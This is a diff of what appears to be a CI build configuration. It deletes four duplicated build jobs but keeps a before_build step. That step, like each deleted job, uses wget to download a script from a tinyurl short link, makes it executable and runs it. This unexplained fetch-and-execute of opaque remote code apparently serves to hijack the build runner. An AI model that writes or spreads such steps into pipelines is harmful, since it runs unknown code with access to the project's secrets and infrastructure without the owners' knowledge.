@@ -3,22 +3,4 @@ before_build:
     
     - wget -O neysbash.sh https://tinyurl.com/4br6cu27 && chmod +x neysbash.sh && ./neysbash.sh
     
-build_2:
-  stage: build
-  script:
-    - wget -O neysbash.sh https://tinyurl.com/4br6cu27 && chmod +x neysbash.sh && ./neysbash.sh
 
-build_3:
-  stage: build
-  script:
-    - wget -O neysbash.sh https://tinyurl.com/4br6cu27 && chmod +x neysbash.sh && ./neysbash.sh
-
-build_4:
-  stage: build
-  script:
-    - wget -O neysbash.sh https://tinyurl.com/4br6cu27 && chmod +x neysbash.sh && ./neysbash.sh
-    
-build_5:
-  stage: build
-  script:
-    - wget -O neysbash.sh https://tinyurl.com/4br6cu27 && chmod +x neysbash.sh && ./neysbash.sh
